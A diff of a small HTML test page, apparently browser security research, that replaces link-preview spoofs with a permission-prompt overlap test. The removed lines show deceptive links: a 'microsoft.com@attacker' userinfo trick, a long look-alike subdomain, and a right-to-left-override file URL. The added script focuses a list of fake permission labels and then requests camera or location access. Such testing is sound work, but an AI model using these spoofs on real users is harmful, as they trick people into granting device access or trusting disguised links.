@@ -1,9 +1,30 @@
+
 <!doctype html>
 <meta charset="utf-8">
-<title>link preview spoof</title>
-<p>Hover, long-press, or inspect native link preview/status UI.</p>
-<a href="https://microsoft.com@attacker.localhost:8765/server-download/fake-origin">https://microsoft.com@attacker.localhost</a>
+<title>select permission overlap</title>
+<select id="s" size="12">
+  <option>login.microsoftonline.com</option>
+  <option>Allow</option>
+  <option>Block</option>
+  <option>Camera</option>
+  <option>Location</option>
+  <option>Microphone</option>
+  <option>Trusted prompt</option>
+</select>
 <br>
-<a href="http://login.microsoftonline.com.account.security.verify.session.trusted.login.attacker.localhost:8765/server-download/fake-origin">long trusted-looking subdomain</a>
-<br>
-<a href="file:///%E2%80%AE/moc.tfosorcim//:sptth">Go to Microsoft</a>
+<button id="geo">focus select then geolocation</button>
+<button id="cam">focus select then camera</button>
+<pre id="out"></pre>
+<script>
+geo.onclick = () => {
+  s.focus();
+  setTimeout(() => navigator.geolocation.getCurrentPosition(() => out.textContent = "geo ok", e => out.textContent = e.message), 200);
+};
+cam.onclick = async () => {
+  s.focus();
+  setTimeout(async () => {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(e => (out.textContent = e.message, null));
+    if (stream) for (const t of stream.getTracks()) t.stop();
+  }, 200);
+};
+</script>
